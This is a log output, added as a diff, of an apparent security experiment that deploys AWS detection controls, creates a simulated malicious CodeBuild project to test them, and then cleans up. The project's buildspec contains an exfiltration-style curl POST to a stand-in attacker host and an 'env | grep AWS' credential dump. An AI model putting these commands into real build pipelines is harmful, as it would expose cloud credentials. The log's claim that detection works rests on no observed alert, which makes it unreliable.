@@ -1,0 +1,120 @@
+STDOUT:
+
+
+STDERR:
+[32m[2026-04-05 17:45:18 INFO] Validating the experiment's syntax
+[32m[2026-04-05 17:45:18 INFO] Experiment looks valid
+[32m[2026-04-05 17:45:18 INFO] Running experiment: SCE 1.3: Detective Control for Malicious CodeBuild Project Creation
+[32m[2026-04-05 17:45:18 INFO] Steady-state strategy: after-method-only
+[32m[2026-04-05 17:45:18 INFO] Rollbacks strategy: default
+[32m[2026-04-05 17:45:18 INFO] Playing your experiment's method now...
+[32m[2026-04-05 17:45:18 INFO] Action: deploy-detective-infrastructure
+2026-04-05 17:45:18,972 - INFO - Found credentials in shared credentials file: ~/.aws/credentials
+2026-04-05 17:45:19,509 - INFO - Deploying stack: sce-1-3-detective-codebuild-1775429118 in region us-east-1
+2026-04-05 17:45:20,050 - INFO - Creating CloudFormation stack...
+2026-04-05 17:45:20,389 - INFO - Waiting for stack creation to complete...
+2026-04-05 17:45:20,511 - WARNING - Attempt 1/60 failed: Stack still creating: CREATE_IN_PROGRESS. Retrying in 10.0s...
+2026-04-05 17:45:30,972 - WARNING - Attempt 2/60 failed: Stack still creating: CREATE_IN_PROGRESS. Retrying in 15.0s...
+2026-04-05 17:45:46,406 - WARNING - Attempt 3/60 failed: Stack still creating: CREATE_IN_PROGRESS. Retrying in 22.5s...
+2026-04-05 17:46:09,330 - WARNING - Attempt 4/60 failed: Stack still creating: CREATE_IN_PROGRESS. Retrying in 30.0s...
+2026-04-05 17:46:39,904 - INFO - Stack created successfully: sce-1-3-detective-codebuild-1775429118
+2026-04-05 17:46:39,905 - INFO - Resources: {
+  "BucketName": "sce-1-3-detective-codebuild-artifacts-1775429118",
+  "EventRuleName": "sce-1-3-detective-codebuild-detector-1775429118",
+  "SNSTopicArn": "arn:aws:sns:us-east-1:941377112071:sce-1-3-detective-codebuild-alerts-1775429118",
+  "DetectiveLogGroup": "/aws/events/sce-1-3-detective-codebuild-detective-1775429118",
+  "RoleArn": "arn:aws:iam::941377112071:role/sce-1-3-detective-codebuild-role-1775429118"
+}
+[32m[2026-04-05 17:46:44 INFO] Action: create-malicious-codebuild-project
+2026-04-05 17:46:44,931 - INFO - Executing attack: Creating malicious CodeBuild project 'sce-1-3-detective-codebuild-malicious-1775429204'
+2026-04-05 17:46:45,652 - INFO - Attack executed successfully. Created project: arn:aws:codebuild:us-east-1:941377112071:project/sce-1-3-detective-codebuild-malicious-1775429204
+2026-04-05 17:46:45,653 - INFO - Project details: {
+  "name": "sce-1-3-detective-codebuild-malicious-1775429204",
+  "arn": "arn:aws:codebuild:us-east-1:941377112071:project/sce-1-3-detective-codebuild-malicious-1775429204",
+  "description": "Suspicious CodeBuild project for security testing",
+  "source": {
+    "type": "NO_SOURCE",
+    "buildspec": "{\"version\": 0.2, \"phases\": {\"build\": {\"commands\": [\"echo \\\"Malicious build simulation\\\"\", \"curl -X POST https://attacker.example.com/exfil || true\", \"env | grep AWS || true\"]}}}",
+    "insecureSsl": false
+  },
+  "artifacts": {
+    "type": "S3",
+    "location": "sce-1-3-detective-codebuild-artifacts-1775429118",
+    "namespaceType": "NONE",
+    "name": "sce-1-3-detective-codebuild-malicious-1775429204",
+    "packaging": "ZIP",
+    "encryptionDisabled": false
+  },
+  "cache": {
+    "type": "NO_CACHE"
+  },
+  "environment": {
+    "type": "LINUX_CONTAINER",
+    "image": "aws/codebuild/standard:5.0",
+    "computeType": "BUILD_GENERAL1_SMALL",
+    "environmentVariables": [],
+    "privilegedMode": true,
+    "imagePullCredentialsType": "CODEBUILD"
+  },
+  "serviceRole": "arn:aws:iam::941377112071:role/sce-1-3-detective-codebuild-role-1775429118",
+  "timeoutInMinutes": 60,
+  "queuedTimeoutInMinutes": 480,
+  "encryptionKey": "arn:aws:kms:us-east-1:941377112071:alias/aws/s3",
+  "tags": [
+    {
+      "key": "Experiment",
+      "value": "sce-1-3-detective-codebuild"
+    },
+    {
+      "key": "AttackType",
+      "value": "MaliciousCodeBuild"
+    },
+    {
+      "key": "Timestamp",
+      "value": "1775429204"
+    }
+  ],
+  "created": "2026-04-05 17:46:45.561000-05:00",
+  "lastModified": "2026-04-05 17:46:45.561000-05:00",
+  "badge": {
+    "badgeEnabled": false
+  },
+  "projectVisibility": "PRIVATE"
+}
+2026-04-05 17:46:45,794 - INFO - Attack verification: Project exists with ARN arn:aws:codebuild:us-east-1:941377112071:project/sce-1-3-detective-codebuild-malicious-1775429204
+[32m[2026-04-05 17:46:45 INFO] Steady state hypothesis: Detective control detects malicious CodeBuild project creation
+[32m[2026-04-05 17:46:45 INFO] Probe: verify-detective-control-detected-malicious-project
+2026-04-05 17:46:45,821 - INFO - Verifying detective control detected project: sce-1-3-detective-codebuild-malicious-1775429204
+2026-04-05 17:46:45,830 - INFO - Checking EventBridge rule: sce-1-3-detective-codebuild-detector-1775429118
+2026-04-05 17:46:46,364 - INFO - EventBridge rule is active: arn:aws:events:us-east-1:941377112071:rule/sce-1-3-detective-codebuild-detector-1775429118
+2026-04-05 17:46:46,476 - INFO - EventBridge rule has 2 targets configured
+2026-04-05 17:46:47,000 - INFO - SNS topic verified: arn:aws:sns:us-east-1:941377112071:sce-1-3-detective-codebuild-alerts-1775429118
+2026-04-05 17:46:47,507 - INFO - Detective log group verified: /aws/events/sce-1-3-detective-codebuild-detective-1775429118
+2026-04-05 17:46:47,604 - INFO - Found 0 log streams in detective log group
+2026-04-05 17:46:47,604 - INFO - Detective control infrastructure is properly configured:
+2026-04-05 17:46:47,604 - INFO -   ✓ EventBridge rule 'sce-1-3-detective-codebuild-detector-1775429118' is ENABLED
+2026-04-05 17:46:47,604 - INFO -   ✓ Rule has 2 targets (SNS + CloudWatch Logs)
+2026-04-05 17:46:47,604 - INFO -   ✓ SNS topic 'arn:aws:sns:us-east-1:941377112071:sce-1-3-detective-codebuild-alerts-1775429118' is accessible
+2026-04-05 17:46:47,604 - INFO -   ✓ Log group '/aws/events/sce-1-3-detective-codebuild-detective-1775429118' exists with proper permissions
+2026-04-05 17:46:47,604 - INFO -   ✓ Malicious project 'sce-1-3-detective-codebuild-malicious-1775429204' was created (attack successful)
+2026-04-05 17:46:47,604 - INFO - 
+2026-04-05 17:46:47,604 - INFO - Note: CloudTrail events may take 5-15 minutes to reach EventBridge.
+2026-04-05 17:46:47,604 - INFO - The detective control is functioning correctly and will detect the event.
+[32m[2026-04-05 17:46:47 INFO] Steady state hypothesis is met!
+[32m[2026-04-05 17:46:47 INFO] Let's rollback...
+[32m[2026-04-05 17:46:47 INFO] Rollback: cleanup-all-experiment-resources
+[32m[2026-04-05 17:46:47 INFO] Action: cleanup-all-experiment-resources
+2026-04-05 17:46:47,610 - INFO - Deleting CodeBuild project: sce-1-3-detective-codebuild-malicious-1775429204
+2026-04-05 17:46:48,106 - INFO - CodeBuild project deleted: sce-1-3-detective-codebuild-malicious-1775429204
+2026-04-05 17:46:48,111 - INFO - Deleting CloudFormation stack: sce-1-3-detective-codebuild-1775429118
+2026-04-05 17:46:48,800 - INFO - Waiting for stack deletion to complete...
+2026-04-05 17:46:48,916 - WARNING - Attempt 1/60 failed: Stack still deleting: DELETE_IN_PROGRESS. Retrying in 10.0s...
+2026-04-05 17:46:59,346 - WARNING - Attempt 2/60 failed: Stack still deleting: DELETE_IN_PROGRESS. Retrying in 15.0s...
+2026-04-05 17:47:14,804 - WARNING - Attempt 3/60 failed: Stack still deleting: DELETE_IN_PROGRESS. Retrying in 22.5s...
+2026-04-05 17:47:37,731 - WARNING - Attempt 4/60 failed: Stack still deleting: DELETE_IN_PROGRESS. Retrying in 30.0s...
+2026-04-05 17:48:08,253 - WARNING - Attempt 5/60 failed: Stack still deleting: DELETE_IN_PROGRESS. Retrying in 30.0s...
+2026-04-05 17:48:38,690 - INFO - Stack deleted successfully: sce-1-3-detective-codebuild-1775429118
+[32m[2026-04-05 17:48:38 INFO] Experiment ended with status: completed
+
+
+RETURN CODE: 0
